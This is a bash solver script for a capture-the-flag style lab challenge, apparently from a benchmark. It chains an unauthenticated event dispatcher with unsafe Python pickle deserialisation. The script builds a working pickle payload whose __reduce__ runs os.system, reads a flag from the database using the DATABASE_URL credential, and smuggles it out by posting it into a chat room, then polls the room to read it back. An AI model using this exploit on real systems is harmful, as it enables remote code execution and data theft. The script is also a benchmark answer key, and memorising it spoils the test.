#!/usr/bin/env bash
# APEX-053-25 — "StreamJack Real-Time Exploitation" (tags: pickle_deserialization, rce)
#
# Two defects that only matter together. The event API takes an event name from
# the caller and dispatches it without asking who is calling, so `admin:getUsers`
# answers anybody. And a message's `metadata` is carried through the queue to a
# Python worker that unpickles it, which is not deserialisation but execution.
#
# The interesting part is the return path. The worker runs in a container with
# no route out and nothing that reports its output — a blind RCE where even the
# error goes to a log the attacker cannot read. What it does have is a database
# connection and the chat application's own address, so the payload reads the
# flag and *posts it into the chat room*, where an ordinary GET can read it.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex053-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

PAYLOAD="$(python3 -c '
import base64, os, pickle

class Worker:
    # `(callable, args)`: what `pickle.loads` will run, and with what.
    def __reduce__(self):
        return (os.system, (
            "python3 -c \"import os,psycopg2,urllib.request,json;"
            "c=psycopg2.connect(os.environ[\x27DATABASE_URL\x27]);k=c.cursor();"
            "k.execute(\\\"SELECT value FROM admin_config WHERE key=\x27flag\x27\\\");"
            "v=k.fetchone()[0];"
            "urllib.request.urlopen(urllib.request.Request("
            "\x27http://chat-app:3053/socket.io/emit\x27,"
            "data=json.dumps({\x27event\x27:\x27message\x27,\x27data\x27:"
            "{\x27room\x27:\x27general\x27,\x27username\x27:\x27loot\x27,\x27content\x27:v}})"
            ".encode(),headers={\x27Content-Type\x27:\x27application/json\x27}))\"",
        ))

print(base64.b64encode(pickle.dumps(Worker())).decode())
')"

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# The event nobody guarded, to show the dispatcher takes its orders from the body.
send "$SESSION" req_0 --create \
    --set method=POST --set path=/socket.io/emit \
    --set header.Content-Type=application/json \
    --set json.event=admin:getUsers --set 'json.data={}' >/dev/null

send "$SESSION" req_0 --create \
    --set method=POST --set path=/socket.io/emit \
    --set header.Content-Type=application/json \
    --set json.event=message \
    --set json.data.room=general --set json.data.username=attacker \
    --set 'json.data.content=Hello everyone!' \
    --set "json.data.metadata=$PAYLOAD" >/dev/null

# The worker answers into the room, when it gets round to it.
FOUND="no flag found"
for _ in $(seq 1 20); do
    FOUND="$(send "$SESSION" req_0 --create --set path=/api/rooms/general/messages | flag)"
    [ "$FOUND" != "no flag found" ] && break
    sleep 2
done
printf '%s\n' "$FOUND"
